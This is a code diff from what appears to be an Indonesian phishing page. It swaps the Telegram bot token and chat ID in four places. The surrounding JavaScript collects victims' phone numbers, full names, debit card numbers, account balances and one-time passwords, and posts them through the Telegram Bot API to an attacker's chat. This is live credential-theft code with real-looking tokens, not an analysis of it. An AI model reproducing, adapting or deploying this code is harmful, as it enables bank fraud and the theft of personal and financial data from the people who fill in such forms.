@@ -8,8 +8,8 @@
 
       var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nama.value;
 
-      var token = '6916130693:AAGyqqD7spqkMGVT52jQ1RWISNpsyqdI5Wc';
-      var grup = '6937029970';
+      var token = '6687872226:AAE7PCYWP5htczR5_hnPdHj8u_zU7bCkMj4';
+      var grup = '6691167179';
 
       $.ajax({
           url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -41,8 +41,8 @@
       var gabungan = '𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomorku.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debit.value;
 
 
-      var token = '6916130693:AAGyqqD7spqkMGVT52jQ1RWISNpsyqdI5Wc';
-      var grup = '6937029970';
+      var token = '6687872226:AAE7PCYWP5htczR5_hnPdHj8u_zU7bCkMj4';
+      var grup = '6691167179';
 
       $.ajax({
           url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -79,8 +79,8 @@
       var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomorku.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debit.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿%3A%0A' + rupiah.value + '%0A%0A𝗞𝗼𝗱𝗲 𝗢𝗧𝗣%3A%0A' + otp.value;
 
 
-      var token = '6916130693:AAGyqqD7spqkMGVT52jQ1RWISNpsyqdI5Wc';
-      var grup = '6937029970';
+      var token = '6687872226:AAE7PCYWP5htczR5_hnPdHj8u_zU7bCkMj4';
+      var grup = '6691167179';
 
       $.ajax({
           url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -130,8 +130,8 @@
       var gabungan = '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + nomorku.value + '%0A𝗡𝗮𝗺𝗮 𝗟𝗲𝗻𝗴𝗸𝗮𝗽%3A%0A' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁%3A%0A' + debit.value + '%0A𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿%3A%0A' + rupiah.value;
 
 
-      var token = '6916130693:AAGyqqD7spqkMGVT52jQ1RWISNpsyqdI5Wc';
-      var grup = '6937029970';
+      var token = '6687872226:AAE7PCYWP5htczR5_hnPdHj8u_zU7bCkMj4';
+      var grup = '6691167179';
 
       $.ajax({
           url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
